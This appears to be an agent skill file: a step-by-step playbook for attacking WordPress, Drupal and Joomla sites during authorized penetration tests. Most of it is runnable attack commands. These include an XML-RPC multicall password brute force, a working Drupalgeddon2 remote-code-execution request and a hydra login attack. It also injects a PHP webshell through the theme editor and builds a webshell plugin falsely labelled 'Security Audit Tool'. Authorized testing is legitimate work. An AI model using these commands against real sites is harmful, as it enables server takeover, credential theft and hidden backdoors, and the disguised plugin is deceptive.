---
name: performing-cms-specific-security-testing
description: Testing WordPress, Drupal, Joomla, and other CMS platforms for known vulnerabilities, plugin/theme exploits, misconfigured permissions, and CMS-specific attack vectors during authorized penetration tests.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- cms
- wordpress
- drupal
- joomla
- web-security
- wpscan
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- DE.CM-01
---

# Performing CMS-Specific Security Testing

## When to Use

- When the target runs WordPress, Drupal, Joomla, Magento, Shopify, or other CMS platforms
- During authorized penetration tests where CMS fingerprinting reveals a known platform
- When testing plugin/theme ecosystems for known CVEs and zero-days
- For assessing CMS admin panel security, default credentials, and misconfigurations
- When evaluating multi-site or headless CMS deployments

### How to CONFIRM a Hit (avoid false negatives)

- **Positive signal**: a **confirmed vulnerable plugin/theme/core version with a working PoC**, or a genuinely exposed/abusable endpoint that returns sensitive data or executes — not a bare version banner.
- Version fingerprinting is a lead, not a finding. A reported "vulnerable version" must be validated against the actual code path (the fix may be backported, or the vulnerable component disabled).
- Do NOT conclude "vulnerable" (or "safe") until you have:
  - Cross-checked the detected version/plugin against the CVE **and** reproduced the issue (e.g. `wpscan` flag confirmed by an actual request that triggers the behavior).
  - For **Drupalgeddon / unauth RCE**: confirmed the command output (e.g. `id`) actually appears in the response, not just a `200`.
  - For **XML-RPC**: confirmed `system.multicall` is enabled AND a known-bad credential returns the success struct (`isAdmin`/blog list), proving the brute-force channel works.
  - For exposed files (`wp-config` backups, `CHANGELOG.txt`, `.sql`, debug logs): confirmed the response **body contains the sensitive content**, not a soft-404 returning `200`.
  - For **admin→RCE**: confirmed you can actually write/execute (theme/plugin editor reachable, upload accepted) rather than assuming from admin access.

## Prerequisites

- **Authorization**: Written penetration testing agreement covering CMS testing
- **WPScan**: WordPress vulnerability scanner (`gem install wpscan` or Docker)
- **droopescan**: Drupal/Joomla/SilverStripe scanner (`pip install droopescan`)
- **CMSmap**: Multi-CMS scanner (`git clone https://github.com/Dionach/CMSmap.git`)
- **nuclei**: Template-based scanner with CMS-specific templates
- **curl/httpie**: For manual API and endpoint testing
- **WPScan API token**: For vulnerability database lookups (free at wpscan.com)

## Workflow

### Step 1: CMS Detection and Fingerprinting

Identify the CMS platform, version, and technology stack.

```bash
# Automated CMS detection
whatweb https://target.example.com -v

# Check common CMS fingerprints manually
# WordPress
curl -s https://target.example.com/wp-login.php -o /dev/null -w "%{http_code}"
curl -s https://target.example.com/wp-json/wp/v2/ | head -c 200
curl -s https://target.example.com/readme.html | grep -i "version"
curl -s https://target.example.com/wp-includes/version.php 2>/dev/null

# Drupal
curl -s https://target.example.com/CHANGELOG.txt | head -5
curl -s -I https://target.example.com/ | grep -i "X-Generator\|X-Drupal"
curl -s https://target.example.com/core/CHANGELOG.txt | head -5

# Joomla
curl -s https://target.example.com/administrator/ -o /dev/null -w "%{http_code}"
curl -s https://target.example.com/language/en-GB/en-GB.xml | grep -i "version"
curl -s https://target.example.com/administrator/manifests/files/joomla.xml | grep -i "version"

# Magento
curl -s https://target.example.com/magento_version -o /dev/null -w "%{http_code}"
curl -s -I https://target.example.com/ | grep -i "X-Magento"

# Version from meta generator tag
curl -s https://target.example.com/ | grep -oP 'content="[^"]*(?:WordPress|Drupal|Joomla)[^"]*"'
```

### Step 2: WordPress Security Testing

Comprehensive WordPress vulnerability assessment.

```bash
# === WPSCAN FULL AUDIT ===

# Enumerate everything: users, plugins, themes, timthumbs
wpscan --url https://target.example.com \
  --enumerate u,ap,at,tt,cb,dbe \
  --api-token $WPSCAN_TOKEN \
  --random-user-agent \
  --force

# Aggressive plugin detection (checks all known plugins)
wpscan --url https://target.example.com \
  --enumerate ap \
  --plugins-detection aggressive \
  --api-token $WPSCAN_TOKEN

# Enumerate users via REST API
curl -s https://target.example.com/wp-json/wp/v2/users | jq '.[].slug'

# Enumerate users via author archives
for i in $(seq 1 20); do
  user=$(curl -s -o /dev/null -w "%{redirect_url}" \
    "https://target.example.com/?author=$i" | grep -oP '/author/\K[^/]+')
  [ -n "$user" ] && echo "User $i: $user"
done

# === WORDPRESS-SPECIFIC ATTACK VECTORS ===

# XML-RPC brute force (bypasses login lockout plugins)
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  "https://target.example.com/xmlrpc.php"

# XML-RPC multicall brute force (test many passwords in one request)
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
      <member><name>params</name><value><array><data>
        <value>admin</value><value>password123</value>
      </data></array></value></member>
    </struct></value>
    <value><struct>
      <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
      <member><name>params</name><value><array><data>
        <value>admin</value><value>admin123</value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>' \
  "https://target.example.com/xmlrpc.php"

# Check for debug.log exposure
curl -s "https://target.example.com/wp-content/debug.log" | head -20

# Check for wp-config backup files
for f in wp-config.php.bak wp-config.php.old wp-config.php.save \
  wp-config.php~ wp-config.txt .wp-config.php.swp; do
  echo -n "$f -> "
  curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/$f"
  echo
done

# REST API information disclosure
curl -s https://target.example.com/wp-json/wp/v2/pages?per_page=100 | jq '.[].title.rendered'
curl -s https://target.example.com/wp-json/wp/v2/posts?status=draft 2>/dev/null | head -c 200

# Check plugin/theme editor (RCE if admin access obtained)
curl -s "https://target.example.com/wp-admin/theme-editor.php" -o /dev/null -w "%{http_code}"
curl -s "https://target.example.com/wp-admin/plugin-editor.php" -o /dev/null -w "%{http_code}"

# Directory listing in uploads
curl -s "https://target.example.com/wp-content/uploads/" | grep -i "index of"
```

### Step 3: Drupal Security Testing

Drupal-specific vulnerability assessment.

```bash
# droopescan for Drupal
droopescan scan drupal -u https://target.example.com

# Drupalgeddon2 check (CVE-2018-7600) — Critical RCE
curl -s -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id' \
  "https://target.example.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"

# Drupalgeddon3 check (CVE-2018-7602)
# Requires authenticated session — test after obtaining creds

# Check for exposed sensitive files
for f in CHANGELOG.txt INSTALL.txt UPDATE.txt MAINTAINERS.txt \
  sites/default/settings.php sites/default/default.settings.php; do
  echo -n "$f -> "
  curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/$f"
  echo
done

# Enumerate modules
curl -s "https://target.example.com/modules/" | grep -i "index of"
for module in views ctools admin_menu devel token pathauto; do
  echo -n "$module -> "
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.example.com/modules/$module/README.txt"
  echo
done

# JSON:API enumeration (Drupal 8+)
curl -s "https://target.example.com/jsonapi" | jq '.links'
curl -s "https://target.example.com/jsonapi/node/article" | jq '.data[].attributes.title'
curl -s "https://target.example.com/jsonapi/user/user" | jq '.data[].attributes.name'
```

### Step 4: Joomla Security Testing

Joomla-specific vulnerability assessment.

```bash
# JoomScan
joomscan -u https://target.example.com

# Manual Joomla enumeration
# Check configuration backup
for f in configuration.php.bak configuration.php.old configuration.php~ \
  configuration.php.save configuration.txt; do
  echo -n "$f -> "
  curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/$f"
  echo
done

# Enumerate components
for comp in com_content com_users com_contact com_finder com_media \
  com_akeeba com_fabrik com_virtuemart com_k2 com_jce; do
  echo -n "$comp -> "
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.example.com/index.php?option=$comp"
  echo
done

# Joomla API (4.x+)
curl -s "https://target.example.com/api/index.php/v1/content/articles" | head -c 200
curl -s "https://target.example.com/api/index.php/v1/users" | head -c 200

# Check for known vulnerable extensions
# JCE Editor (common RCE target)
curl -s -o /dev/null -w "%{http_code}" \
  "https://target.example.com/index.php?option=com_jce"
```

### Step 5: Common CMS Vulnerabilities (All Platforms)

Cross-platform CMS attack patterns.

```bash
# === ADMIN PANEL BRUTE FORCE ===
# WordPress
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.example.com http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -t 4

# === DEFAULT CREDENTIALS ===
# Test common CMS defaults
declare -A CMS_DEFAULTS=(
  ["admin"]="admin password admin123 wordpress drupal joomla"
  ["administrator"]="administrator admin123 password"
  ["root"]="root toor password123"
)

# === PLUGIN/EXTENSION VULNERABILITY SCANNING ===
# Use nuclei with CMS-specific templates
nuclei -u https://target.example.com -tags wordpress -severity critical,high
nuclei -u https://target.example.com -tags drupal -severity critical,high
nuclei -u https://target.example.com -tags joomla -severity critical,high

# === EXPOSED INSTALLATION FILES ===
for f in install.php setup.php install/index.php \
  installation/index.php wp-admin/install.php \
  wp-admin/setup-config.php; do
  echo -n "$f -> "
  curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/$f"
  echo
done

# === DATABASE EXPORT/BACKUP FILES ===
for f in backup.sql database.sql dump.sql db.sql \
  backup.zip site.zip wp-content/backup-db; do
  echo -n "$f -> "
  curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/$f"
  echo
done

# === CRON/SCHEDULED TASK EXPOSURE ===
curl -s "https://target.example.com/wp-cron.php" -o /dev/null -w "%{http_code}"
curl -s "https://target.example.com/cron.php" -o /dev/null -w "%{http_code}"
```

### Step 6: CMS-Specific Post-Authentication Attacks

After obtaining admin credentials, escalate to RCE.

```bash
# === WORDPRESS ADMIN → RCE ===
# 1. Theme editor: Appearance → Theme Editor → 404.php
# Inject: <?php system($_GET['cmd']); ?>
# Trigger: /wp-content/themes/THEME_NAME/404.php?cmd=id

# 2. Plugin upload: Install a PHP webshell as a plugin ZIP
# Create malicious plugin:
mkdir -p shell-plugin && cat > shell-plugin/shell.php << 'EOF'
<?php
/*
Plugin Name: Security Audit Tool
Description: Authorized security testing tool
Version: 1.0
*/
if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); }
EOF
cd shell-plugin && zip ../shell-plugin.zip shell.php && cd ..
# Upload via Plugins → Add New → Upload Plugin

# === DRUPAL ADMIN → RCE ===
# Enable PHP filter module → Create content with PHP code
# Or use: admin/config/development/php

# === JOOMLA ADMIN → RCE ===
# Extensions → Templates → Edit index.php
# Inject PHP code into template file
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **CMS Fingerprinting** | Identifying the specific CMS platform, version, and installed components |
| **Plugin/Theme Exploitation** | Targeting known CVEs in third-party CMS extensions |
| **XML-RPC Abuse** | Using WordPress XML-RPC for brute force and SSRF attacks |
| **Drupalgeddon** | Critical RCE vulnerabilities in Drupal core (CVE-2018-7600, CVE-2018-7602) |
| **REST/JSON API Exposure** | Information disclosure through unauthenticated CMS API access |
| **Admin-to-RCE** | Escalating CMS admin access to server-level code execution |
| **WP-Cron Abuse** | Triggering scheduled tasks or using cron for denial of service |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **WPScan** | WordPress vulnerability scanner with plugin/theme/user enumeration |
| **droopescan** | Drupal, Joomla, and SilverStripe scanner |
| **JoomScan** | OWASP Joomla vulnerability scanner |
| **CMSmap** | Multi-CMS vulnerability scanner (WordPress, Drupal, Joomla) |
| **nuclei** | Template-based scanner with extensive CMS vulnerability templates |
| **magescan** | Magento-specific security scanner |
| **whatweb** | CMS and technology fingerprinting |

## Common Scenarios

### Scenario 1: Outdated Plugin RCE
WordPress site runs an outdated Contact Form 7 plugin with a known file upload bypass (CVE). Uploading a PHP webshell through the contact form achieves RCE as the www-data user.

### Scenario 2: Drupalgeddon2 Unauthenticated RCE
Drupal 7.x site is vulnerable to CVE-2018-7600. A single crafted POST request to /user/register executes arbitrary commands on the server without authentication.

### Scenario 3: WordPress XML-RPC Credential Stuffing
Login page has rate limiting and CAPTCHA, but XML-RPC multicall endpoint is open. Using system.multicall, testing 500 passwords per request bypasses all login protections.

### Scenario 4: Joomla Extension SQL Injection
A vulnerable Joomla component (com_fabrik) has an unauthenticated SQL injection in the list parameter. Using sqlmap extracts the Joomla super admin password hash from the #__users table.

## Output Format

```
## CMS Vulnerability Finding

**Vulnerability**: WordPress XML-RPC Authentication Bypass (Credential Stuffing)
**Severity**: High (CVSS 7.5)
**Location**: POST /xmlrpc.php - system.multicall method
**CMS Version**: WordPress 6.2.1

### Reproduction Steps
1. Enumerate users via /wp-json/wp/v2/users → found: admin, editor
2. Send XML-RPC system.multicall with 500 password candidates per request
3. Response contains <name>isAdmin</name><value><boolean>1</boolean></value> for password "Company2024!"
4. Logged in successfully as admin at /wp-login.php

### Impact
- Full WordPress admin access
- Theme/plugin editor enables RCE (code execution as www-data)
- Database access via wp-config.php credentials
- User data, posts, and private content fully accessible

### Recommendation
1. Disable XML-RPC if not needed: add_filter('xmlrpc_enabled', '__return_false')
2. Block system.multicall method specifically
3. Implement fail2ban rules for XML-RPC brute force
4. Use strong, unique passwords and enforce 2FA for all admin accounts
5. Update WordPress core and all plugins to latest versions
```
